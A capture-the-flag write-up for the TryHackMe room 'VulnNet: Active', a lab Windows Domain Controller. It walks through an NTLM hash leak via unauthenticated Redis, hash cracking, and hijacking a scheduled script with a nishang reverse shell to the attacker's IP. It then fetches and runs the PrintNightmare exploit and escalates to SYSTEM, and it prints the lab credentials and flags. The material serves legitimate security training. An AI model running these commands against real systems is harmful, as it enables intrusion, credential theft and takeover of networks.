# NULLSECURE - FROM NULL TO ROOT

**Room:** VulnNet: Active
**Platform:** TryHackMe
**Difficulty:** Medium
**Category:** Windows / Active Directory
**Video:** [YOUTUBE VIDEO LINK]

---

## 1. Overview

VulnNet: Active is a Medium-difficulty Windows/Active Directory box built around an exposed, unauthenticated Redis instance. Abusing Redis's `CONFIG SET dir` command to point at a UNC path leaks an NTLMv2 hash to an attacker-controlled SMB listener. The cracked credentials unlock a writable SMB share, which is hijacked to plant a reverse shell inside a script that runs on a schedule. Full compromise is achieved via the PrintNightmare Print Spooler vulnerability (CVE-2021-1675), which escalates a low-privileged shell straight to `NT AUTHORITY\SYSTEM`.

**Chain at a glance:** Redis (no auth) → UNC path hash leak → NTLMv2 crack → SMB access → writable share hijack → reverse shell → PrintNightmare → SYSTEM.

---

## 2. Recon

Initial port scan:

```bash
rustscan -a <TARGET-IP> --ulimit 5000 -- -sC -sV
```

Relevant open ports:

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 135/139/445 | RPC / NetBIOS / SMB | SMB signing enabled and required |
| 464 | kpasswd5 | Kerberos password change service |
| 6379 | Redis 2.8.2402 | No authentication configured |
| 9389 | mc-nmf (.NET Message Framing) | Active Directory Web Services |

The combination of 464 (kpasswd5) and 9389 (ADWS) confirms this host is a **Domain Controller**. The standout is port 6379 — an exposed Redis service, which is unusual on a Windows AD host and becomes the initial foothold.

---

## 3. Vulnerability Identification

Connecting to Redis directly with no credentials:

```bash
redis-cli -h <TARGET-IP>
CONFIG GET dir
CONFIG GET dbfilename
```

![Redis CONFIG GET dir/dbfilename](images/02-redis-config-get.png)

Redis is unauthenticated and allows `CONFIG GET`/`CONFIG SET` freely. Since the Redis process is running as a Windows service account, setting the `dir` value to a UNC path (`\\<ATTACKER-IP>\share`) forces the underlying Windows process to reach out over SMB to resolve that path — triggering an NTLM authentication attempt against a host of the attacker's choosing. This is the classic **Redis-on-Windows UNC path injection → NTLM hash leak** technique.

---

## 4. Exploitation

Stand up a rogue SMB listener to catch the incoming authentication attempt — either Responder or Metasploit's SMB capture module work:

```bash
sudo responder -I tun0 -dwv
# or
msfconsole -q
search capture/smb
use auxiliary/server/capture/smb
set SRVHOST <ATTACKER-IP>
exploit
```

![Metasploit SMB capture module](images/03-msf-smb-capture.png)

With the listener running, trigger the UNC path lookup from `redis-cli`:

```bash
CONFIG SET dir \\<ATTACKER-IP>\share
```

The capture module records an NTLMv2 handshake:

![CONFIG SET dir triggers the UNC lookup](images/04a-hash-capture-trigger.png)
![NTLMv2 hash captured in the listener](images/04b-hash-captured.png)

Save the hash and crack it offline:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat cracking result](images/05-hashcat-cracked.png)

Result — valid domain credentials:

```
ENTERPRISE-SECURITY : sand_0873959498
```

---

## 5. Post-Exploitation

Validate the credentials over SMB and enumerate shares:

```bash
nxc smb <TARGET-IP> -u 'ENTERPRISE-SECURITY' -p 'sand_0873959498'
nxc smb <TARGET-IP> -u 'ENTERPRISE-SECURITY' -p 'sand_0873959498' --shares
```

![NetExec SMB auth + share listing](images/06-nxc-shares.png)

An `Enterprise-Share` comes back writable. Connecting with `smbclient` reveals an existing script that is presumably re-executed on a schedule:

```bash
smbclient //<TARGET-IP>/Enterprise-Share -U 'ENTERPRISE-SECURITY'%'sand_0873959498'
get PurgeIrrelevantData_1826.ps1
```

![smbclient - pulling the scheduled script](images/07-smbclient-get.png)

**Hijacking the scheduled script:** rather than uploading a brand-new file (which may not get executed), the nishang reverse-shell payload is placed inside a file with the *same name* as the legitimate script:

```bash
cp nishang/Shells/Invoke-PowerShellTcp.ps1 ./PurgeIrrelevantData_1826.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER-IP> -Port 443' >> PurgeIrrelevantData_1826.ps1

smbclient //<TARGET-IP>/Enterprise-Share -U 'ENTERPRISE-SECURITY'%'sand_0873959498'
put PurgeIrrelevantData_1826.ps1
```

![smbclient - overwriting with the weaponized script](images/08-smbclient-put.png)

Start a listener and wait for the scheduled task to fire:

```bash
nc -lnvp 443
```

Shell lands as a low-privileged user:

```bash
cd ..
cd Desk*
type user.txt
```

**User flag:** `THM{3eb176aee96432d5b100bc93580b291e}`

![Reverse shell + user flag](images/09-revshell-userflag.png)

---

## 6. Privilege Escalation

The box is vulnerable to **PrintNightmare (CVE-2021-1675)**. Host the PoC locally and pull it from the reverse shell:

```bash
python3 -m http.server <PORT>
```

```powershell
Invoke-WebRequest -Uri http://<ATTACKER-IP>:<PORT>/CVE-2021-1675.ps1 -OutFile CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare
net users
```

![Hosting the PoC](images/10-http-server.png)
![Invoke-Nightmare + net users](images/11-invoke-nightmare.png)

The exploit (PoC by calebstewart) abuses a Print Spooler RPC flaw to create a new local administrator — by default `adm1n:P@ssw0rd` (a custom `-NewUser`/`-NewPassword` pair also works). Use those credentials to pop a SYSTEM shell via Impacket:

```bash
impacket-psexec 'adm1n:P@ssw0rd@<TARGET-IP>'
whoami
```

```
nt authority\system
```

```bash
cd C:\Users\Admin*\Des*
type system.txt
```

**Root flag:** `THM{d540c0645975900e5bb9167aa431fc9b}`

![impacket-psexec SYSTEM shell + root flag](images/12-psexec-system.png)

---

## 7. Conclusion

| # | Phase | Technique | Tool / CVE |
|---|---|---|---|
| 1 | Recon | Port & service enumeration | RustScan + Nmap |
| 2 | Vulnerability ID | Unauthenticated Redis, UNC path abuse | redis-cli |
| 3 | Exploitation | NTLM hash capture & offline cracking | Responder / Metasploit `capture/smb`, Hashcat (mode 5600) |
| 4 | Post-Exploitation | Writable SMB share, scheduled-script hijack | smbclient, nishang `Invoke-PowerShellTcp` |
| 5 | Privilege Escalation | Print Spooler RCE | CVE-2021-1675 (PrintNightmare) |
| 6 | Full Compromise | Credential reuse to SYSTEM shell | impacket-psexec |

---

## 8. Attack Chain Summary

Exposed, unauthenticated Redis → `CONFIG SET dir` to a UNC path leaks an NTLMv2 hash to a rogue SMB listener → hash cracked offline with Hashcat → valid `ENTERPRISE-SECURITY` domain credentials → writable `Enterprise-Share` discovered → scheduled PowerShell script hijacked with a nishang reverse shell → low-privileged shell + user flag → PrintNightmare (CVE-2021-1675) creates a local admin → impacket-psexec → `NT AUTHORITY\SYSTEM` → root flag.

---

A1GCH ⚔ NullSecure
